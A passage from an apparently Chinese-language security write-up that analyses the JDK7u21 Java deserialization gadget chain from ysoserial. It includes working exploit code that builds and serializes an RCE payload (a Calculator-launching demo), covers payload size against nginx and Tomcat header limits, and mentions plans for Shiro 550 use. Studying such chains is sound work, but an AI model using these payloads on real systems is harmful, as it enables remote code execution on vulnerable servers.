            TemplatesImpl calc = (TemplatesImpl) Gadgets.createTemplatesImpl("open /System/Applications/Calculator.app");//生成恶意的calc
            HashMap map = new HashMap();
            InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
            Reflections.setFieldValue(tempHandler, "type", Templates.class);
            Templates proxy = Gadgets.createProxy(tempHandler, Templates.class);
            proxy.equals(calc);
        }
    }
调用栈如下,开始逐一分析吧。
这里就是检验`equals`这个方法是不是被重写了,原生的话是会进入`equalsImpl`这个函数的。
    private Boolean equalsImpl(Object var1) {
           // 判断var1是否为AnnotationInvocationHandle,var1是templates，pass
            if (var1 == this) {
                return true;
              // 构造限制点，type属性限制了var1必须为this.type的类实例
            } else if (!this.type.isInstance(var1)) {
                return false;
            } else {
                //这里获取了当前成员的方法
                Method[] var2 = this.getMemberMethods();
                int var3 = var2.length;
                for(int var4 = 0; var4 () {
                    public Method[] run() {
                        Method[] var1 = AnnotationInvocationHandler.this.type.getDeclaredMethods();
                        AccessibleObject.setAccessible(var1, true);
                        return var1;
                    }
                });
            }
            return this.memberMethods;
        }
结果发现是通过反射机制从`this.type`这个类属性去获取的。
`Reflections.setFieldValue(tempHandler, "type", Templates.class);`
所以这里我们只要控制type为`Templates.class`就行了。
里面就有`newTransformer`方法,且为第一个,如果是第二个、第三个话,前面可能会因为参数不对等原因出现错误，导致程序没能执行到`newTransformer`方法就中断了。
### 0x4.3 第三层 LinkedHashSet
第三层的核心就是触发`proxy.equals(calc);`
    final Object templates = Gadgets.createTemplatesImpl(command);
            String zeroHashCodeStr = "f5a5a608";
            HashMap map = new HashMap();
            map.put(zeroHashCodeStr, "foo");
            InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
            Reflections.setFieldValue(tempHandler, "type", Templates.class);
            Templates proxy = Gadgets.createProxy(tempHandler, Templates.class);
            LinkedHashSet set = new LinkedHashSet(); // maintain order
            set.add(templates);
            set.add(proxy);
            Reflections.setFieldValue(templates, "_auxClasses", null);
            Reflections.setFieldValue(templates, "_class", null);
            map.put(zeroHashCodeStr, templates); // swap in real object
这里我们可以直观梳理出第三层关键作用的代码:
    LinkedHashSet set = new LinkedHashSet(); // maintain order
            set.add(templates);
            set.add(proxy);
这是最外层`LinkedHashSet`,这个对象在反序列化的时候会自动触发`readObject`方法,从而开始了exp的执行流程
通过查看序列化规则`writeObject`
    private void writeObject(java.io.ObjectOutputStream s)
            throws java.io.IOException {
            // Write out any hidden serialization magic
            s.defaultWriteObject();
            // Write out HashMap capacity and load factor
            s.writeInt(map.capacity());
            s.writeFloat(map.loadFactor());
            // Write out size
            s.writeInt(map.size());
            // Write out all elements in the proper order.
            for (E e : map.keySet())
                s.writeObject(e);
        }
我们可以知道它的序列化规则
    s.defaultWriteObject();
    s.writeInt(map.capacity());
    s.writeFloat(map.loadFactor());
    s.writeInt(map.size());
    for (E e : map.keySet())
    s.writeObject(e);
可以看到有个获取map大小，然后循环写入的过程。(也就是循环写入每一个元素)
在我们的exp里面分别按顺序执行`set.add(templates);` 、`set.add(proxy);` 添加了两个元素。
这到底是为什么需要两个呢？
还有就是
    String zeroHashCodeStr = "f5a5a608";
    HashMap map = new HashMap();
    map.put(zeroHashCodeStr, "foo");
    .......
    InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
    map.put(zeroHashCodeStr, templates); // swap in real object
我们对创建的代理对象设置了一个特殊的`HashMap map`,
作为了`memberValues`属性的值。 让我们带着这两个问题去分析一下。
**从readObject开始分析**
这里先取出了我们先传入第一个`templates`, 其中`PRESENT` 是一个空的Object 跟进看下 `map.put` 方法的处理
    public V put(K key, V value) {
            if (key == null)
                return putForNullKey(value);
            int hash = hash(key);
            int i = indexFor(hash, table.length);
            for (Entry e = table[i]; e != null; e = e.next) {
                Object k;
                if (e.hash == hash && ((k = e.key) == key || key.equals(k))) {
                    V oldValue = e.value;
                    e.value = value;
                    e.recordAccess(this);
                    return oldValue;
                }
            }
            modCount++;
            addEntry(hash, key, value, i);
            return null;
        }
因为table一开始为空的，所以我们第一次进入不了循环,最后进入
传入了我们第一个实例通过`hash()`计算出的hash、实例和空object和 `indexFor()`计算出的i值
通过`addEntry`方法添加到了`table`这个Entry中,继续往下执行,
跳转回`map.put(e, PRESENT);`传入我们第二个代理实例。
先记住当前传入的这些值，后面就会发现这些值会有神奇的作用。
我们继续重复上次的操作，先计算`hash`
因为是代理对象,执行方法的时候会进入`invoke`
我们跟进`hashCodeImpl`
    private int hashCodeImpl() {
            int var1 = 0;
            Entry var3;
            for(Iterator var2 = this.memberValues.entrySet().iterator(); var2.hasNext(); var1 += 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())) {
                var3 = (Entry)var2.next();
            }
            return var1;
        }
var2遍历我们传入的map对象,其中var3就是我们的map对象。
`var1 += 127 * ((String)var3.getKey()).hashCode() ^
memberValueHashCode(var3.getValue()`
其中
`var3.getKey()).hashCode()`
这个值`f5a5a608`计算结果为0.
`memberValueHashCode(var3.getValue()`
这个值直接返回`map.put(zeroHashCodeStr, templates);` 中的`templates`的`hashcode`结果。
所以
    var1 += 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())
其实就是:
    var1 += 0^memberValueHashCode(var3.getValue())
`0^x =x`,所以结果就是`templates`的`hashcode`的结果。
这个结果恰好是我们第一次传入的对象结果。
    LinkedHashSet set = new LinkedHashSet(); // maintain order
            // 第一次传入的是templates实例
            set.add(templates);
            // 第二次传入的是proxy代理实例
            set.add(proxy);
**虽然我们传入的两个不一样的东西，但是计算hashcode的时候，代理实例的值使我们可以通过设置`this.memberValue`来控制的。**
后面继续向下走:
`e.hash == hash && ((k = e.key) == key || key.equals(k))`
首先`e.hash == hash`这个是满足的,根据&& 短路原则，会继续计算右边的结果,`(k = e.key) == key`
这里进行了赋值`K = e.key`所以k就是`templates`,显然不会等于代理类对象key。根据 ||的短路原则
最终进入了`key.equals(k)`,也就是前面我们所说的`proxy.equals(calc)`，成功完成整个反序列化的RCE链。
## 0x5 POC 长度
    package ysoserial.example;
    import ysoserial.payloads.Jdk7u21;
    import java.io.*;
    public class PayloadOk {
        public static void main(String[] args) {
            try {
                Object calc = new Jdk7u21().getObject("open /System/Applications/Calculator.app");
                ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();//用于存放person对象序列化byte数组的输出流
                ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(new File("/tmp/payload.ser")));
                objectOutputStream.writeObject(calc);//序列化对象
                objectOutputStream.flush();
                objectOutputStream.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
可以看到这个POC的Base64之后大小只有3489个字节。常见的nginx header头部max length 4096和tomcat的8192
都可以兼容这个POC。
我们可以继续浏览下其他的反序列化链的大小。
可以看到不同的POC,字节大小的区别还是挺大的,针对不同的容器,选择不同的POC，以及对POC的优化还是很有必要的。
## 0x6 总结
这个链条第一次看的时候感觉真的挺复杂的，但是通过分析之后，理解起来还是比较简单的。但是能够发现这个反序列化链绝对是神级大佬级别的(好奇ing,这种链条的发现真的骚)。后面分析下如何在Shiro
550 tomcat环境中利用该链条执行命令回显。
## 0x7 参考链接
[Java 领域概念：JDK、JRE、JVM](https://zhuanlan.zhihu.com/p/83429963)
[Ysoserial JDK7u21](https://y4er.com/post/ysoserial-jdk7u21/)
[Security Advisory – Java
SE](https://gist.github.com/frohoff/24af7913611f8406eaf3)
[JDK反序列化Gadget
7u21](\[https://lalajun.github.io/2019/11/30/JDK%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets%207u21/\]\(https://lalajun.github.io/2019/11/30/JDK反序列化Gadgets
7u21/))
[Java反序列化系列 ysoserial
Hibernate1](https://mp.weixin.qq.com/s/O1ay4BHiyPBkotNIgDQ6Kg)
[Java反序列 Jdk7u21 Payload 学习笔记](https://b1ngz.github.io/java-deserialization-jdk7u21-gadget-note/)
[java中的反射](https://www.cnblogs.com/tech-bird/p/3525336.html)
[java的动态代理机制详解](https://www.cnblogs.com/xiaoluo501395377/p/3383130.html)